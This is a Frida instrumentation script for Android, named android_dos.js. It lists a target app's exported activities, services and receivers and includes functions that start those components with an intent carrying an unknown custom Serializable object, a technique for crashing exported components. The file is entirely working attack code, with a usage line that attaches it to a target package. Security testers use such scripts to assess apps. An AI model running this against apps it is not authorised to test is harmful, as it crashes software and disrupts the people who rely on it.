// Jussi
// frida -U -f com.xxx.xxx -l F:\ford\android_dos.js --no-pause

function getAppcontext(){
    const ActivityThread = Java.use("android.app.ActivityThread");
    const currentApplication = ActivityThread.currentApplication();
    return currentApplication.getApplicationContext();
}
 
function getActivityInfos(){
    const context = getAppcontext()
    const PackageManagerhandle = Java.use("android.content.pm.PackageManager")
    var GET_ACTIVITIES = PackageManagerhandle.GET_ACTIVITIES.value
    var packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), GET_ACTIVITIES)
    return packageInfo.activities
}
 
function getExportedActivitys(){
    const activityInfos = getActivityInfos()
    let activitys = []
    try{
        activityInfos.value.map(info => {
            if(info.exported.value){
            activitys.push(info.name.value)
            }
        })
    }catch(e){

    }
    
    return activitys
}

function getExportedServices(){
    const context = getAppcontext()
    const PackageManagerhandle = Java.use("android.content.pm.PackageManager")
    var GET_SERVICES = PackageManagerhandle.GET_SERVICES.value
    var packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), GET_SERVICES)
    const servicesInfos = packageInfo.services
    let services = []
    try{
        servicesInfos.value.map(info => {
             if(info.exported.value){
                services.push(info.name.value)
             }
        })
    }catch(e){

    }
    return services
}

function getExportedReceivers(){
    const context = getAppcontext()
    const PackageManagerhandle = Java.use("android.content.pm.PackageManager")
    var GET_RECEIVERS = PackageManagerhandle.GET_RECEIVERS.value
    var packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), GET_RECEIVERS)
    const receiversInfos = packageInfo.receivers
    let receivers = []
    try{
        receiversInfos.value.map(info => {
            if(info.exported.value){
            receivers.push(info.name.value)
            }
        })
    } catch(e){

    }
    
    return receivers
}

function createSerialiZable(){
    var mySerialiZable = Java.registerClass({
        name: 'com.example.mySerialiZable', 
        implements: [Java.use("java.io.Serializable")],
        methods: {
        }
      })
    var result = mySerialiZable.$new()
    // console.log(result)
    return result
}

function getExportedModule(){
    Java.perform(function(){
        console.warn("\n=============== Exported Activitys =============")
        const activitys = getExportedActivitys()
        for(var i = 0; i < activitys.length; i++){
            console.log(activitys[i])
        }

        console.warn("\n=============== Exported Services =============")
        const services = getExportedServices()
        for(var i = 0; i < services.length; i++){
            console.log(services[i])
        }

        console.warn("\n=============== Exported Receivers =============")
        const receivers = getExportedReceivers()
        for(var i = 0; i < receivers.length; i++){
            console.log(receivers[i])
        }

        console.warn("\n===============================================\n")
    })
}

function startActivity(name){
    Java.perform(function(){
        const context = getAppcontext()
        const intenthandle = Java.use("android.content.Intent").$new()
        intenthandle.setClassName(context, name)
        intenthandle.addFlags(0x10000000)
        intenthandle.putExtra("xp_text", createSerialiZable())
        // intenthandle.putExtra("test", "text")
        context.startActivity(intenthandle)
    })
}

function startService(name){
    Java.perform(function(){
        const context = getAppcontext()
        const intenthandle = Java.use("android.content.Intent").$new()
        intenthandle.setClassName(context, name)
        intenthandle.putExtra("flag", "Jussi")
        // intenthandle.putExtra("xp_text", createSerialiZable())
        context.startService(intenthandle)
    })
}

function startReceiver(name){
    Java.perform(function(){
        const context = getAppcontext()
        const intenthandle = Java.use("android.content.Intent").$new()
        intenthandle.setClassName(context, name)
        // intenthandle.putExtra("flag", "Jussi")
        // intenthandle.putExtra("xp_text", createSerialiZable())
        // intenthandle.setAction("android")
        context.sendBroadcast(intenthandle)
    })
}

setTimeout(getExportedModule, 100)
